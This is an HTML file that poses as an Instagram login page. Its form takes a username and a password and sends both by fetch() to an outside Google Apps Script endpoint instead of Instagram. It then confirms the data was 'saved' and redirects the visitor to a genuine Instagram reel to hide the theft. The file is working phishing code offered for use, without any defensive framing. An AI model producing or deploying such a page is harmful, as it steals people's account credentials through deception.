<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Instagram Login</h1>
        <form id="Instagram Login Page" action="https://script.google.com/macros/s/AKfycbwsfYL9P-m-pErlsCfBe2LXrf_owuS06p3t_opW1mbyK1EO1GMnicRF5C_cL8fPLYU9/exec" method="POST">
            <div class="input-group">
                <label for="name">Username</label>
                <input type="text" id="name" name="name" required>
            </div>
            <div class="input-group">
                <label for="email">Password</label>
                <input type="text" id="email" name="email" required>
            </div>
            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('Instagram Login Page').onsubmit = function(event) {
            event.preventDefault(); // Prevent default form submission
            const formData = new FormData(this);

            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                alert("Data saved successfully!");
                this.reset();

                // Redirect to the next page
                window.location.href = "https://www.instagram.com/reel/DD_X79XJJUq/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA=="; 
            })
            .catch(error => {
                alert("Error occurred: " + error);
            });
        };
    </script>
</body>
</html>
